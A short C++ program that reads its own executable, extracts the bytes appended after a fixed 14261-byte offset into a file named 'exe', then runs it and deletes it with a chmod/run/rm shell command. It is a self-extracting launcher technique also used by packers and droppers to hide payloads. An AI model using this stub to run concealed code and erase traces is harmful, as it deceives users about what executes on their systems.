#include <iostream>
#include <fstream>

constexpr int MYSIZE = 14261;

using namespace std;

int main (int argc, char** argv) {
    int c;
    string exe = "exe";
    string me = (string)argv[0];
    ifstream fi(me);
    ofstream fo(exe);
    if (fi.is_open() && fo.is_open()) {
        fi.seekg(MYSIZE, fi.beg);
        while ((c = fi.get()) != -1) fo << (char)c;
        fi.close();
        fo.close();
        c = system("chmod u+x exe;./exe;rm -f exe");
    }
}